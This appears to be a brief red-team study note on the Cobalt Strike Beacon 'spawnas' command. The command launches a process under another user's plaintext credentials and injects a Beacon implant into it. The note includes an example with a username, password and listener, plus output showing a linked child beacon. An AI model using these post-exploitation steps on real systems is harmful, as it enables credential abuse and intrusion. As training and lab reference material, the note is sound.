# [[SpawnAs]]  
___

## Description:  
TheÂ `spawnas`Â command will spawn a new process using the plaintext credentials of another user and inject a Beacon payload into it. This creates a new logon session with the interactive logon type, which makes it good for local actions, but also creates a whole user profile on disk if not already present.

Attempt this from a directory where the target user has read access.

This command does not require local admin privileges and will also usually fail if run from a SYSTEM Beacon.

```
beacon> spawnas DEV\jking Purpl3Drag0n tcp-4444-local
[+] established link to child beacon: 10.10.17.231
```
